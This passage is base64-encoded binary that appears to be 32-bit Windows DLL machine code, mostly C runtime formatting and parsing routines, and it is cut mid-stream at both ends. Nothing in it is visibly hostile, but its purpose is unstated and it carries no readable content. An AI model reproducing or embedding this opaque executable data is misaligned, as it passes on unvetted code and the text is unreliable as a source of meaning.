/6egDAACLB4PHBIm93P3//zvGdGSLcAQz/zv3dFsPtwhmOUgCD4KMBQAA94Xw/f//AAgAAA+3wXQuM8mL0PfSQYTRD4RuBQAAi9b30oTRD4RiBQAAibXk/f//0eiJjcj9///pgAMAAIm9yP3//4m15P3//+lvAwAAoRDAAhCJheT9//+NUAGKCECEyXX5K8LpUwMAAIP4cA+PgAEAAA+EaAEAAIP4ZQ+MQQMAAIP4Zw+OBv7//4P4aXQxg/huD4S9+v//g/hvD4UhAwAA9oXw/f//gMeF4P3//wgAAAB0HYGN8P3//wACAADrEYON8P3//0DHheD9//8KAAAAi4Xw/f//qQCAAAAPhG8BAACLB4tXBIPHCOmXAQAAdRGA+Wd1Z8eF6P3//wEAAADrWzmF6P3//34GiYXo/f//u6MAAAA5nej9//9+Oou16P3//4HGXQEAAFb/FUSTARBZio3v/f//iYW8/f//hcB0DomF5P3//4m1rP3//+sOiZ3o/f//6waKje/9///2hfD9//+AdAqBjcT9//+AAAAAiwf/tcT9//+LteT9////tej9//+DxwiJhZj9//+LR/yJhZz9//8PvsFQ/7Ws/f//jYWY/f//VlCJvdz9///opff//4PEGIA+LXUQgY3w/f//AAEAAP+F5P3//4uF5P3//41QAYoIQITJdfnpgv7//8eF6P3//wgAAACJlbj9///rJIPocw+EA/3//0hID4TE/v//g+gDD4W2AQAAx4W4/f//JwAAAPaF8P3//4DHheD9//8QAAAAD4Sk/v//ioW4/f//BFHGhdT9//8wiIXV/f//x4XQ/f//AgAAAOmA/v//qQAQAAAPhYb+//+DxwSoIHQXib3c/f//qEB0Bg+/R/zrBA+3R/yZ6xKoQItH/HQDmesCM9KJvdz9///2hfD9//9AdBs71n8XfAQ7xnMR99iD0gD32oGN8P3//wABAAD3hfD9//8AkAAAi9qL+HUCM9uDvej9//8AfQzHhej9//8BAAAA6xqDpfD9///3uAACAAA5hej9//9+BomF6P3//4vHC8N1BiGF0P3//41184uF6P3///+N6P3//4XAfwaLxwvDdC2LheD9//+ZUlBTV+ik9P//g8Ewg/k5iZ2s/f//i/iL2n4GA424/f//iA5O672NRfMrxkb3hfD9//8AAgAAiYXg/f//ibXk/f//dGGFwHQHi86AOTB0Vv+N5P3//4uN5P3//8YBMEDrPklmOTB0BkBAO8519CuF5P3//9H46yg7/nULoRDAAhCJheT9//+LheT9///rB0mAOAB0BUA7znX1K4Xk/f//iYXg/f//g72w/f//AA+FZgEAAIuF8P3//6hAdDKpAAEAAHQJxoXU/f//LesYqAF0CcaF1P3//yvrC6gCdBHGhdT9//8gx4XQ/f//AQAAAIudzP3//yud4P3//yud0P3///aF8P3//wx1F/+1tP3//42F2P3//1NqIOiq9P//g8QM/7XQ/f//i720/f//jYXY/f//jY3U/f//6LD0///2hfD9//8IWXQb9oXw/f//BHUSV1NqMI2F2P3//+ho9P//g8QMg73I/f//AHRxg73g/f//AH5oi4Xg/f//i7Xk/f//iYWs/f//D7cG/42s/f//UGoGjUX0UI2FpP3//0ZQRuhI9f//g8QQhcB1KDmFpP3//3Qg/7Wk/f//jYXY/f//jU306Cb0//+Dvaz9//8AWXW16yGDjdj9////6xj/teD9//+LjeT9//+Nhdj9///o+vP//1mDvdj9//8AfBv2hfD9//8EdBJXU2ogjYXY/f//6LLz//+DxAyDvbz9//8AdBT/tbz9////FTCTARCDpbz9//8AWYudoP3//4u93P3//zP2igOIhe/9//+EwHQvisjpL/b///8VFJMBEMcAFgAAADPAUFBQUFDp2/X///8VFJMBEFdXV1dX6cX1//85tcD9//90DYO9wP3//wcPhaX1//+Lhdj9//+LTfxfXjPNW+iF5///ycOQtDoBEMk4ARD5OAEQVzkBEKI5ARCtOQEQ8jkBEA07ARCL/1WL7IPsIFeLfQyD//91CcdF5P///3/rK4H/////f3Yg/xUUkwEQxwAWAAAAM8BQUFBQUOgW5///g8QUg8j/62qJfeRTVv91FIt1CP91EI1F4FCJdeiJdeDHRexCAAAA6Kb0//+L2DPAg8QMO9iIRD7/fRE5ReR8LTvwdCU7+HYhiAbrHf9N5HgHi03giAHrEY1N4FFQ6Iw4AABZWYP4/3QEi8PrA2r+WF5bX8nDi0gM9sFAdAaDeAgAdDWDQAT+uv//AAB4DYsIZokxgwACD7fO6wiDySCJSAyLymY7ynUQUP8V8JIBEFmFwHQEgw//w/8Hw4v/VYvsg30MAFeL+H4bVotFEIt1CP9NDOid////gz//dAaDfQwAf+deX13Di/9Vi+z2QwxAV4v4dA2DewgAdQeLRQwBB+s8g30MAH42VotFCA+3MP9NDIvD6Fz///+DRQgCgz//dRX/FRSTARCDOCp1EGo/i8Ne6D7///+DfQwAf8xeX13Di/9Vi+yB7GgEAAChAMACEDPFiUX8i0UIU4tdEFaLdQxXM/+Jhdj7//+Jnej7//+JvbT7//+Jvfj7//+JvdD7//+JvfT7//+Jvdz7//+Jvcj7//+Jvaz7//+JvdT7//87x3Uh/xUUkwEQV1dXV1fHABYAAADoXOX//4PEFIPI/+k/CgAAO/d02w+3Dom94Pv//4m97Pv//4m9wPv//4m9uPv//4mN5Pv//2Y7zw+ECwoAAEZGOb3g+///ibWw+///D4ziCQAAjUHgZoP4WHcPD7fBD7aAGJQBEIPgD+sCM8CLlcD7//9rwAkPtoQQOJQBEGoIwegEWomFwPv//zvCD4Re////g/gHD4d3CQAA/ySF+04BEION9Pv///+Jvcj7//+Jvaz7//+JvdD7//+Jvdz7//+Jvfj7//+JvdT7///pTgkAAA+3wYPoIHRIg+gDdDQrwnQkSEh0FIPoAw+FIgkAAAmV+Pv//+klCQAAg434+///BOkZCQAAg434+///AekNCQAAgY34+///gAAAAOn+CAAAg434+///AunyCAAAZoP5KnUriwODwwQ7x4md6Pv//4mF0Pv//w+N0wgAAION+Pv//wT3ndD7///pwQgAAIuF0Pv//2vACg+3yY1ECNCJhdD7///ppggAAIm99Pv//+mbCAAAZoP5KnUliwODwwQ7x4md6Pv//4mF9Pv//w+NfAgAAION9Pv////pcAgAAIuF9Pv//2vACg+3yY1ECNCJhfT7///pVQgAAA+3wYP4SXRRg/hodECD+Gx0GIP4dw+FOggAAIGN+Pv//wAIAADpKwgAAGaDPmx1EUZGgY34+///ABAAAOkUCAAAg434+///EOkICAAAg434+///IOn8BwAAD7cGZoP4NnUZZoN+AjR1EoPGBIGN+Pv//wCAAADp2gcAAGaD+DN1GWaDfgIydRKDxgSBpfj7////f///6bsHAABmg/hkD4SxBwAAZoP4aQ+EpwcAAGaD+G8PhJ0HAABmg/h1D4STBwAAZoP4eA+EiQcAAGaD+FgPhH8HAACJvcD7//+Lhdj7//+NveD7//+L8ceF1Pv//wEAAADo/fv//+lPBwAAD7fBg/hkD49KAgAAD4SXAgAAg/hTD48TAQAAdH2D6EF0EEhIdFhISHQISEgPhXoFAACDwSDHhcj7//8BAAAAiY3k+///g434+///QDm99Pv//42F/Pv//4mF8Pv//7gAAgAAiYXM+///D41pAgAAx4X0+///BgAAAOnBAgAA94X4+///MAgAAA+FwgAAAION+Pv//yDptgAAAPeF+Pv//zAIAAB1B4ON+Pv//yCLvfT7//+D//91Bb////9/g8ME9oX4+///IImd6Pv//4tb/Imd8Pv//w+ElAQAAIXbdQuhEMACEImF8Pv//4Ol7Pv//wCLtfD7//+F/w+OrAQAAIoGhMAPhKIEAAAPtsBQ/xUIkwEQWYXAdAFGRv+F7Pv//zm97Pv//3zX6X4EAACD6FgPhJECAABISA+EigAAAIPoBw+E/f7//0hID4VcBAAAD7cDg8MEM/ZG9oX4+///IIm11Pv//4md6Pv//4mFqPv//3Q3iIW8+///oQyTARDGhb37//8A/zCNhbz7//9QjYX8+///UP8VEJMBEIPEDIXAfQ+Jtaz7///rB2aJhfz7//+Nhfz7//+JhfD7//+Jtez7///p4wMAAIsDg8MEiZ3o+///O8d0YotwBDv3dFsPtwhmOUgCD4I7+///94X4+///AAgAAA+3wXQuM8mL0PfSQYTRD4Qd+///i9b30oTRD4QR+///ibXw+///0eiJjdT7///pfQMAAIm91Pv//4m18Pv//+lsAwAAoRDAAhCJhfD7//+NUAGKCECEyXX5K8LpUAMAAIP4cA+PdQEAAA+EXQEAAIP4ZQ+MPgMAAIP4Zw+Ozv3//4P4aXQtg/huD4Si+v//g/hvD4UeAwAA9oX4+///gImV5Pv//3QdgY34+///AAIAAOsRg434+///QMeF5Pv//woAAACLhfj7//+pAIAAAA+EbQEAAAPai0P4i1P86ZUBAAB1EmaD+Wd1X8eF9Pv//wEAAADrUzmF9Pv//34GiYX0+///v6MAAAA5vfT7//9+OIu19Pv//4HGXQEAAFb/FUSTARBZi43k+///iYW4+///hcB0DomF8Pv//4m1zPv//+sGib30+///9oX4+///gHQKgY3I+///gAAAAIsD/7XI+///i7Xw+////7X0+///g8MIiYWY+///i0P8iYWc+///D77BUP+1zPv//42FmPv//1ZQiZ3o+///6Cbr//+DxBiAPi11EIGN+Pv//wABAAD/hfD7//+LhfD7//+NUAGKCECEyXX56Y3+//+JlfT7///HhbT7//8HAAAA6ySD6HMPhND8//9ISA+Ey/7//4PoAw+FvgEAAMeFtPv//ycAAAD2hfj7//+Ax4Xk+///EAAAAA+Eq/7//2owWGaJhcT7//+LhbT7//+DwFFmiYXG+///x4Xc+///AgAAAOmC/v//qQAQAAAPhYj+//+DwwSoIHQXiZ3o+///qEB0Bg+/Q/zrBA+3Q/yZ6xKoQItD/HQDmesCM9KJnej7///2hfj7//9AdBs7138XfAQ7x3MR99iD0gD32oGN+Pv//wABAAD3hfj7//8AkAAAi9qL+HUCM9uDvfT7//8AfQzHhfT7//8BAAAA6xqDpfj7///3uAACAAA5hfT7//9+BomF9Pv//4vHC8N1BiGF3Pv//421+/3//4uF9Pv///+N9Pv//4XAfwaLxwvDdC2LheT7//+ZUlBTV+gd6P//g8Ewg/k5iZ2k+///i/iL2n4GA420+///iA5O672Nhfv9//8rxkb3hfj7//8AAgAAiYXs+///ibXw+///dF6FwHQHi8aAODB0U/+N8Pv//4uF8Pv///+F7Pv//8YAMOs8hdt1C6EUwAIQiYXw+///i4Xw+///x4XU+///AQAAAOsJT2aDOAB0BkBAhf918yuF8Pv//9H4iYXs+///g72s+///AA+FcwEAAIuF+Pv//6hAdCupAAEAAHQEai3rDqgBdARqK+sGqAJ0FGogWWaJjcT7///Hhdz7//8BAAAAi7XQ+///K7Xs+///K7Xc+///ibWk+///qAx1F/+12Pv//42F4Pv//1ZqIOgg9v//g8QM/7Xc+///i53Y+///jYXE+///UI2F4Pv//+gr9v//9oX4+///CFlZdBv2hfj7//8EdRJTVmowjYXg+///6Nz1//+DxAyDvdT7//8AdXyLhez7//+FwH5yi43w+///iY3k+///iYXM+///oQyTARD/MP+NzPv///+15Pv//42FqPv//1D/FRCTARCL2IPEDIXbfi6Lhdj7//+Ltaj7//+NveD7///oLvX//wGd5Pv//4O9zPv//wCLtaT7//9/q+sig43g+////+sZ/7Xs+///jYXg+////7Xw+///6Gn1//9ZWYO94Pv//wB8IPaF+Pv//wR0F/+12Pv//42F4Pv//1ZqIOgV9f//g8QMg724+///AHQU/7W4+////xUwkwEQg6W4+///AFmLnej7//+LtbD7//8z/w+3BomF5Pv//2Y7x3QHi8jpCvb//zm9wPv//3QNg73A+///Bw+FpvX//4uF4Pv//4tN/F9eM81b6Bfb///Jw4v/QUcBEDxFARBsRQEQyEUBEBRGARAfRgEQZUYBEGNHARCL/1WL7IPsIFNXi30Mg///dQnHReT///9/6zGB/////z92I/8VFJMBEDPbU1NTU1PHABYAAADoptr//4PEFIPI/+mRAAAAjQQ/iUXkVv91FIt1CP91EI1F4FCJdeiJdeDHRexCAAAA6KD0//8zyTPbg8QMO8OJRQxmiUx+/n0SOV3kfE8783ROO/t2SmaJDutF/03keAqLReCIGP9F4OsRjUXgUFPoDywAAFlZg/j/dCL/TeR4B4tF4IgY6xGNReBQU+jyKwAAWVmD+P90BYtFDOsDav5YXl9bycOL/1WL7FOLHjldCA+FgQAAAIsHO0UMdWWNRQhQagJZi8P34VJQ6BLl//+DxAyFwH0EM8DrYGoEU/8VUJMBEFlZiQeFwHTr/3UIi0UQ/3UMxwABAAAA/zfo2uT//4sGVgPAagJQiQbo/OT//4PEGIXAfSD/N/8VMJMBEFnrtGoEU1D/FTDAAhCDxAyFwHSjiQfRJjPAQFtdw4v/VYvs90UIAP8AAFZ1Gw+3dQiLxiX/AAAAUP8VPJMBEFmFwHQEi8brCg+3RQiD4N+D6AdeXcOL/1WL7Lj//wAAZjtFCHQGXemCLQAAXcOL/1WL7Fb/dQj/B+heLAAAD7fwuP//AABZZjvwdA9qCFb/FeySARBZWYXAddlmi8ZeXcOL/1WL7IPsLKEAwAIQM8WJRfyLRRCJVdiLE4lV8ItVCFaA4ggPvvL33hv2/w+JReQPtwBRUIlN4Oh4////i0UIiUXsg2XsEFlZdQP/TRiJReiDZegBg33oAHQOi0UU/00UhcAPhBwBAAD/deD/B+jIKwAAWYtN5GaJAbn//wAAZolF1GY7yA+E5gAAAIN97AB1VvZFCCB0EmaD+AlyBmaD+A12BmaD+CB1PvZFCEAPhL4AAABmi8hmwekDD7fRZjvCD4KrAAAAi8iD4QczwEDT4A+3yotVDA++DBEzzoXBD4SNAAAAi0XU9kUIBHV7g30YAA+EtAAAAPZFCAJ0EIsLZokBgwMC/00Y6Uf///+LDQyTARCLVRhQOxFyDP8z/xX0kgEQWVnrL41F9FD/FfSSARBZWYlF3IXAfgU7RRh3bIP4BXdnUI1F9FD/M+jL4v//i0Xcg8QMhcAPjvb+//8BAylFGOns/v//g0XwAunj/v///w+LReQPtwD/deBQ6DL+//9ZWYtF8DsDdDr2RQgEdU+LRdj/AIN97AB1RPZFCAKLA3Q5M8lmiQjrNf8VFJMBEPZFCALHAAwAAAB0GItN8DPAZokBg8j/i038M81e6CrX///Jw4tF8MYAAOvoxgAAM8Dr5Iv/VYvsUVNWV78AIAAAVzPb/xVEkwEQi/BZhfZ1Ev8VFJMBEGoMWYkIi8FfXlvJw1dqAFbo+OH//4tVDIMCAosCg8QMal5ZZjsIdQZAQINNCAhqXVlmOwgPhY8AAABRQFtAxkYLIOmCAAAAD7fJQGotX0CJTfxmO/l1VmaF23RRD7cIal1fZjv5dEYPt/lAQGY733MFD7fP6wYPt8sPt99mO9l3KCvLQQ+3yQ+304lN/IvKwekDjTwxi8qD4QezAdLjCB9C/038deeLVQwz2+scD7dN/A+3XfyL0cHqA408MoPhB7IB0uIIF4tVDA+3CGpdX2Y7+Q+Fb////2aDOAB1EoPP/1b/FTCTARBZi8fpF/////91JItNIP91HItdGP91EIt9FFb/dQiJAotVKOjn/P//g8QUi/jryov/VYvsgewgAwAAoQDAAhAzxYlF/ItVEItFDItNCFYz9omV7Pz//42VQP3//4mNKP3//4mFGP3//4mVHP3//8eFAP3//14BAACJtQT9//+JtTz9//+JteD8//87xnUh/xUUkwEQVlZWVlbHABYAAADoV9X//4PEFIPI/+m4DgAAVzvOdSP/FRSTARCDz/9WVlZWVscAFgAAAOgu1f//g8QUi8fpjw4AAA+3AMaFJv3//wCJtTT9//+JtQj9//9mO8YPhGoOAACLtRj9//8z/1OLHeySARBqCFD/01lZhcB0QP+1KP3///+NNP3///+1KP3//429NP3//+iv+///D7fAWVDojfv//1lZRkYPtwZqCFD/01lZhcB18DP/6WcNAABqJVhmOwYPhRsNAACJvfT8//+JvSD9//+JvRT9//+JvTD9//+Jvej8///GhSX9//8AxoUn/f//AMaFO/3//wDGhS/9//8AxoUu/f//AYm9/Pz//0ZGD7ceibUY/f//98MA/wAAdS0PtsNQ/xU8kwEQWYXAdB6LhTD9////hRT9//9rwAqNRBjQiYUw/f//6doAAACD+04Pj5cAAAAPhMsAAACD+yoPhIAAAACD+0YPhLkAAACD+0l0FIP7TA+FgAAAAP6FLv3//+mgAAAAD7dOAmaD+TZ1JY1GBGaDODR1HP+F/Pz//4m9DP3//4m9EP3//4mFGP3//4vw63Fmg/kzdQmNRgRmgzgydOdmg/lkdFxmg/lpdFZmg/lvdFBmg/l4dEpmg/lYdRnrQv6FJ/3//+s6g/todCmD+2x0DYP7d3QX/oU7/f//6yONRgJmgzhsdI3+hS79///+hS/9///rDP6NLv3///6NL/3//4C9O/3//wAPhNn+//+AvSf9//8AdRmLhez8//+LGImF5Pz//4PABImF7Pz//+sCM9uAvS/9//8AiZ34/P//xoU7/f//AHUdD7cGZoP4U3QNxoUv/f//AWaD+EN1B8aFL/3///+LhRj9//8PtzCDziCD/m50SoP+Y3QYg/57dBP/tSj9//+NvTT9///oj/n//+sR/7Uo/f///4U0/f//6OolAAAPt8CJhTz9//+4//8AAFlmO4U8/f//D4SPCwAAg70U/f//AHQNg70w/f//AA+EMwsAAIqNJ/3//4TJdVaD/mN0CoP+c3QFg/57dUeLheT8//+LGIPABImF5Pz//4PABDP/iYXs/P//i0D8R4md+Pz//4mF6Pz//zvHcxqAvS/9//8AD47rCgAAM8BmiQPp5AoAADP/R4P+bw+P8AQAAA+EBQcAAIP+Yw+ExgQAAIP+ZA+E8wYAAA+O/AQAAIP+Z35Ag/5pdByD/m4PhekEAACLhTT9//+EyQ+E9wkAAOkeCgAAamReai1YZjuFPP3//w+F/wQAAMaFJf3//wHp/wQAAGotWDPbZjuFPP3//3UNi40c/f//ZokBi9/rDGorWGY7hTz9//91If+NMP3///+1KP3///+FNP3//+irJAAAD7fAWYmFPP3//4O9FP3//wB1B4ONMP3////3hTz9//8A/wAAD4WNAAAAD7aFPP3//1D/FTyTARBZhcB0eouFMP3///+NMP3//4XAdGpmD76FPP3//4uNHP3///+FIP3//2aJBFmNhQT9//9QjYVA/f//UENTjb0c/f//jbUA/f//6ND2//+DxAyFwA+E2wkAAP+1KP3///+FNP3//+gJJAAAD7fAWYmFPP3//6kA/wAAD4Rz////x4Xw/P//LgAAAP8VAJMBEIsNDJMBEP8x/zCNhfD8//9Q/xUQkwEQD7eF8Pz//w++jTz9//+DxAw7wQ+FBwEAAIuFMP3///+NMP3//4XAD4TzAAAA/7Uo/f///4U0/f//6I8jAACLjRz9//8Pt8CJhTz9//9mi4Xw/P//ZokEWY2FBP3//1CNhUD9//9QQ1ONvRz9//+NtQD9///o//X//4PEEIXAD4QKCQAA94U8/f//AP8AAA+FjAAAAA+2hTz9//9Q/xU8kwEQWYXAdHmLhTD9////jTD9//+FwHRpi4Uc/f//ZouNPP3///+FIP3//2aJDFiNhQT9//9QjYVA/f//UENTjb0c/f//jbUA/f//6In1//+DxAyFwA+ElAgAAP+1KP3///+FNP3//+jCIgAAD7fAWYmFPP3//6kA/wAAD4R0////g70g/f//AA+ElQEAAGplWGY7hTz9//90EGpFWGY7hTz9//8PhXkBAACLhTD9////jTD9//+FwA+EZQEAAIuNHP3//2plWGaJBFmNhQT9//9QjYVA/f//UENTjb0c/f//jbUA/f//6O30//+DxAyFwA+E+AcAAP+1KP3///+FNP3//+gmIgAAWQ+3wGotWYmFPP3//2Y7yHUuUYuNHP3//1hmiQRZjYUE/f//UI2FQP3//1BDU+ie9P//g8QMhcAPhKkHAADrDGorWGY7hTz9//91M4uFMP3///+NMP3//4XAdQghhTD9///rG/+1KP3///+FNP3//+ixIQAAD7fAWYmFPP3///eFPP3//wD/AAAPhYwAAAAPtoU8/f//UP8VPJMBEFmFwHR5i4Uw/f///40w/f//hcB0aYuFHP3//2aLjTz9////hSD9//9miQxYjYUE/f//UI2FQP3//1BDU429HP3//421AP3//+jn8///g8QMhcAPhPIGAAD/tSj9////hTT9///oICEAAA+3wFmJhTz9//+pAP8AAA+EdP////+1KP3///+NNP3///+1PP3//+hu9P//g70g/f//AFlZD4SmBgAAgL0n/f//AA+F7gUAAIu9AP3//4u1HP3///+FCP3//zPAjXw/AldmiQRe/xVEkwEQi9hZhdsPhGsGAABXVlP/FeiSARD/tfD8//8PvoUu/f//U/+1+Pz//0hQ6IoeAABT/xUwkwEQg8Qg6Y0FAACDvRT9//8AahBYD4WCAQAA/4Uw/f//6XcBAACLxoPocA+ECQIAAIPoAw+EVwEAAEhID4T/AQAAg+gDD4Qy+///g+gDdDVmi4U8/f//i5UY/f//ZjkCD4W2BQAA/o0m/f//hMkPhSQFAACLheT8//+Jhez8///pEwUAAGpA6QcBAABqK1hmO4U8/f//dTX/jTD9//91EoO9FP3//wB0CcaFO/3//wHrG/+1KP3///+FNP3//+i/HwAAD7fAWYmFPP3//2owWGY7hTz9//8PhboBAAD/tSj9////hTT9///olB8AAFkPt8BqeFmJhTz9//9mO8h0UGpYWWY7yHRIib0g/f//g/54dBuDvRT9//8AdA7/jTD9//91Bv6FO/3//2pv613/tSj9////jTT9//9Q6Lzy//9Zx4U8/f//MAAAAOlGAQAA/7Uo/f///4U0/f//6CEfAACDvRT9//8AD7fAWYmFPP3//3QVg60w/f//Ajm9MP3//30G/oU7/f//anhe6QYBAABqIIO9FP3//wBYdAILx4C9L/3//wB+A4PIAoTJdAODyASD/nt1QI2NCP3//1H/tej8//+Njfj8////tSj9////tTD9//9RjY00/f//UY2NPP3//1GNjRj9//9RUOg69P//g8Qk6zb/tej8//+NjTz9////tTD9//+NlQj9//9Ri40o/f//agBQjZ34/P//jb00/f//6B3y//+DxBSFwA+FDgQAAOleAwAAxoUu/f//AWotWGY7hTz9//91CcaFJf3//wHrDGorWGY7hTz9//91Nf+NMP3//3USg70U/f//AHQJxoU7/f//Aesb/7Uo/f///4U0/f//6PUdAAAPt8CJhTz9//9Zg738/P//AA+EiwEAAIC9O/3//wAPhU0BAAC7AP8AAIP+eA+EgQAAAIP+cHR8hZ08/f//D4UVAQAAD7aFPP3//1D/FTyTARBZhcAPhP4AAACD/m91MWo4WGY7hTz9//8PhukAAACLhQz9//+LjRD9//8PpMEDweADiYUM/f//iY0Q/f//63pqAGoK/7UQ/f///7UM/f//6KUbAACJhQz9//+JlRD9///rV4WdPP3//w+FmQAAAA+2hTz9//9Q/xUEkwEQWYXAD4SCAAAAi4UM/f//i40Q/f///7U8/f//D6TBBMHgBImFDP3//4mNEP3//+g48P//D7fAWYmFPP3//w+3hTz9////hSD9//+D6DCZAYUM/f//EZUQ/f//g70U/f//AHQI/40w/f//dDn/tSj9////hTT9///orBwAAA+3wFmJhTz9///p0f7///+1KP3///+NNP3///+1PP3//+gA8P//WVmAvSX9//8AD4QtAQAAi4UM/f//i40Q/f//99iD0QD32YmFDP3//4mNEP3//+kJAQAAgL07/f//AIud9Pz//w+F5QAAAL8A/wAAg/54dEeD/nB0QoW9PP3//w+FsQAAAA+2hTz9//9Q/xU8kwEQWYXAD4SaAAAAg/5vdRVqOFhmO4U8/f//D4aFAAAAweMD6zhr2wrrM4W9PP3//3VzD7aFPP3//1D/FQSTARBZhcB0YP+1PP3//8HjBOgJ7///D7fAWYmFPP3//w+3hTz9////hSD9//+DvRT9//8AjVwD0Imd9Pz//3QI/40w/f//dDn/tSj9////hTT9///ogxsAAA+3wFmJhTz9///pOf////+1KP3///+NNP3///+1PP3//+jX7v//WVmAvSX9//8AdAj324md9Pz//4P+RnUHg6Ug/f//AIO9IP3//wAPhPIAAACAvSf9//8AdT7/hQj9//+Lnfj8//+LhfT8//+Dvfz8//8AdBOLhQz9//+JA4uFEP3//4lDBOsQgL0u/f//AHQEiQPrA2aJA4OFGP3//wL+hSb9//+LtRj9//8z/+sl/7Uo/f///4U0/f//6MIaAABZZosOD7fARkaJhTz9//9mO8h1Ybj//wAAZjuFPP3//3UNZoM+JXVbZoN+Am51VA+3BmY7xw+FPPL//+tG/7Uo/f///7U8/f//6zHGAwD/FRSTARDHAAwAAADrJ/+1KP3///+1PP3//+jP7f//ib3g/P//6wz/tSj9//9Q6Lvt//9ZWYO9BP3//wFbdQ3/tRz9////FTCTARBZuP//AABmO4U8/f//dRSLhQj9//+FwHUsOIUm/f//dSTrIoO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